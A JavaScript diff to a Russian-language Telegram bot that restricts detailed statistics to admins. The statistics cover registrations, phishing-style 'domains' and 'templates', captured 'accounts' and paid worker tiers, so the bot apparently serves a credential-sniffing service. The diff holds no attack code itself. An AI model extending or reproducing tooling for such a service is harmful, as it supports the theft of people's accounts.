@@ -191,8 +191,9 @@ bot.onText(/📊 О боте/, async (msg) => {
         tg_id: msg.chat.id
     })
     if (user.isAccepted == 'true' && !user.edit_mode && !user.ban) {
-        const users = await data.find(),
-            accounts = await account.find(),
+        const accounts = await account.find()
+        if(user.isAdmin){
+            const users = await data.find(),
             links = await link.find();
         let reg_today = 0,
             reg_week = 0,
@@ -257,7 +258,8 @@ bot.onText(/📊 О боте/, async (msg) => {
                 accs_month++
             }
         })
-        bot.sendMessage(msg.chat.id, `📊 Статистика\n\n😻Регистраций в боте за сегодня: ${reg_today}\n😻Регистраций в боте за неделю: ${reg_week}\n😻Регистраций в боте за месяц: ${reg_month}\n😻Регистраций в боте за все время: ${reg_alltime}\n\n👨‍👩‍👧‍👦 Подписчиков в Новостях: ${await bot.getChatMemberCount('@ssniffer')}\n👨‍👩‍👧‍👦 Подписчиков в Чате: ${await bot.getChatMemberCount('@sniffer_chat')}\n👨‍👩‍👧‍👦 Подписчиков в Отзывах: ${await bot.getChatMemberCount('@ssniffero')}\n\n📎 Количество доменов: ${sites}\n📁 Количество шаблонов: ${pattern}\n\n🍀 Аккаунтов за сегодня: ${accs_today}\n🍀 Аккаунтов за неделю: ${accs_week}\n🍀 Аккаунтов за месяц: ${accs_month}\n🍀 Аккаунтов за все время: ${accs_alltime}\n\n👑 Пользователи [⛏Рабочий]: ${vip_1}\n👑 Пользователи [🤴🏻Любитель]: ${vip_2}\n👑 Пользователи [🥷Профи]: ${vip_3}\n👑 Пользователи [👀Предпрениматель]: ${vip_4}\n\n📅 Мы работаем с 2021 года.`, {
+        }
+        bot.sendMessage(msg.chat.id, user.isAdmin? `📊 Статистика\n\n😻Регистраций в боте за сегодня: ${reg_today}\n😻Регистраций в боте за неделю: ${reg_week}\n😻Регистраций в боте за месяц: ${reg_month}\n😻Регистраций в боте за все время: ${reg_alltime}\n\n👨‍👩‍👧‍👦 Подписчиков в Новостях: ${await bot.getChatMemberCount('@ssniffer')}\n👨‍👩‍👧‍👦 Подписчиков в Чате: ${await bot.getChatMemberCount('@sniffer_chat')}\n👨‍👩‍👧‍👦 Подписчиков в Отзывах: ${await bot.getChatMemberCount('@ssniffero')}\n\n📎 Количество доменов: ${sites}\n📁 Количество шаблонов: ${pattern}\n\n🍀 Аккаунтов за сегодня: ${accs_today}\n🍀 Аккаунтов за неделю: ${accs_week}\n🍀 Аккаунтов за месяц: ${accs_month}\n🍀 Аккаунтов за все время: ${accs_alltime}\n\n👑 Пользователи [⛏Рабочий]: ${vip_1}\n👑 Пользователи [🤴🏻Любитель]: ${vip_2}\n👑 Пользователи [🥷Профи]: ${vip_3}\n👑 Пользователи [👀Предпрениматель]: ${vip_4}\n\n📅 Мы работаем с 2021 года.`:`📊 О боте\n\n🙈 Регистраций в боте:  ${accounts.length}\n🕘 Стабильно работаем с 2021 года\n\n🧑‍💻 Администрация проекта: @suise`, {
             parse_mode: 'HTML'
         })
     } else {
